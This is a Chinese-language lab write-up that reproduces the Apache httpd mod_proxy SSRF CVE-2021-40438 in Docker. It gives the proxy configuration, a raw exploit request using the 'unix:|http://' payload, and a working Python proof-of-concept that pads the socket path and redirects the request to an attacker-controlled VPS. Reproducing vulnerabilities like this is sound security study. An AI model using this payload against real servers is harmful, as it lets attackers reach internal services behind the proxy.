# [原创]CVE-2021-40438Apache SSRF漏洞复现

# Apache SSRF漏洞复现
## 一、环境搭建
> M1装个docker真麻烦，后来才发现是我的/usr/local/bin目录有问题太草了
下载httpd，在百度找了好久都没有找到可以编译的，只能尝试一下docker
```bash
docker pull httpd:2.4.48
```
![image-20211020164217588](upload/attach/202110/809626\_9F6TW6WDCCZHD5M.jpg)
```
docker run -p 80:80 -v $PWD/www/:/usr/local/apache2/htdocs/ -d httpd
```
![image-20211020164316557](upload/attach/202110/809626\_65CDCZBPR9Z9BF9.jpg)
随后进入docker中，改配置
![image-20211020164714549](upload/attach/202110/809626\_RJM4Y9KDT9KJQW5.jpg)
> 如果没有vim就自己下一个
>
> ```bash
> apt update
> apt install vim
> ```
主要取消注释了五个
```bash
LoadModule proxy\_html\_module modules/mod\_proxy\_html.so
LoadModule proxy\_module modules/mod\_proxy.so
LoadModule proxy\_connect\_module modules/mod\_proxy\_connect.so
LoadModule proxy\_ftp\_module modules/mod\_proxy\_ftp.so
LoadModule proxy\_http\_module modules/mod\_proxy\_http.so
```
随后查看`httpd-vhost.conf`
首先需要在httpd.conf中将这一行给去掉`#`注释
![image-20211020171638590](upload/attach/202110/809626\_EHK6VKZYF4KRKM2.jpg)
随后将`httpd-vhost.conf`中添加`ProxyPass`和`ProxyPassReverse`
![image-20211020172738673](upload/attach/202110/809626\_HVPKHN8RBYQ6AZ2.jpg)
```bash
<VirtualHost \*:80>
ServerAdmin webmaster@dummy-host.example.com
DocumentRoot "/usr/local/apache2/htdocs/"
ServerName localhost
ServerAlias www.dummy-host.example.com
ErrorLog "logs/dummy-host.example.com-error\_log"
CustomLog "logs/dummy-host.example.com-access\_log" common
ProxyPass "/" http://127.0.0.1:8000
ProxyPassReverse "/" http://127.0.0.1:8000
</VirtualHost>
```
## 二、漏洞复现
![image-20211020173116064](upload/attach/202110/809626\_V6R8VVE434E5YXN.jpg)
请求头
```http
GET /?unix:|http://127.0.0.1:9999/vv HTTP/1.1
Host: 192.168.1.7
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```
既然能访问到本地端口，想试试能不能访问其他地址的指定端口，所以我又开了一台docker
![image-20211020173248071](upload/attach/202110/809626\_T6QJSGM8T993RYW.jpg)
> 后来想着懒得折腾docker 就用服务器开了一个8000端口，python的简易服务器
![image-20211020174557896](upload/attach/202110/809626\_8RA57N2WPT7VM8X.jpg)
docker telnet没什么问题
![image-20211020174650815](upload/attach/202110/809626\_REYED9YSC2PDK6S.jpg)
然后，可以访问公网，不过有个疑问，这玩意的利用点在哪
![image-20211020175035935](upload/attach/202110/809626\_HJ2T2HXBA3EDRAC.jpg)
## 三、POC编写
先看看POC结果
![image-20211020180802476](upload/attach/202110/809626\_2EGD3476UQH74B8.jpg)
```python
'''
Email: Uzjuer@163.com
Blog: Blog.CatGames.cn
By: UzJu
'''
import requests
def poc(ip, vps):
"""
:param ip: 传服务器地址要加上http或https
:param vps: 传vps地址 要加上http或https
:return:
"""
try:
payload = f"{ip}/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
f"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
f"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
f"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
f"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
f"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
f"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
f"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
f"|{vps}"
headers = {
"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:93.0) Gecko/20100101 Firefox/93.0"
}
r = requests.get(payload, headers=headers, timeout=5)
# if r.status\_code == 503:
# poc("http://192.168.1.7", "http://xxxx:8000/")
print("[-]请求结果", r)
except requests.exceptions.ReadTimeout as e:
print('[+]可能存在SSRF漏洞')
poc("http://192.168.1.7", "http://xxxx:8000/")
```
经过测试，运行第一次有时候会报错报503这种，多运行几次就可以了
